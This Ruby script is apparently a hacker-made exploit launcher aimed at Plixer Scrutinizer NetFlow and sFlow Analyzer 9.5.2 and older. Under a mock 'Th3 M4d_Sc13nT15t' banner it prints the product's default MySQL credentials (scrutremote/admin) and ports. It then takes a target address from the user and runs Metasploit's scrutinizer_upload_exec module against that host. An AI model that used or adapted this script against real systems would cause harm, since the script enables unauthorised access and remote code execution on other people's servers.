require 'colorize'
puts """
      Th3 M4d_Sc13nT15t is here to stay...

  We trust you have received teh usual lecture
      from the local System Administrator. 

 It usually boils down to these three things:
		#1) Respect the privacy of others.
		#2) Think before you type.
		#3) With great poewr comes great responsibility.""".white
puts """
    Plixer Scrutinizer NetFlow and sFlow Analyzer 9
            Default MySQL Credential

  Scrutinizer NetFlow and sFlow Analyzer 9.5.2 or older
         
""".red
puts """
    The HTTP Server's remote port 80
     The MySQL's remote port is 3306
   The default MySQL password is admin
 The default MySQL username is scrutremote
""".white


puts " [?] What is the target? ".blue
print "[!] ---> ".yellow
target = gets.chomp





exec("msfconsole -x 'use exploit/windows/mysql/scrutinizer_upload_exec' -x 'setg RHOST #{target}' -x 'run'")


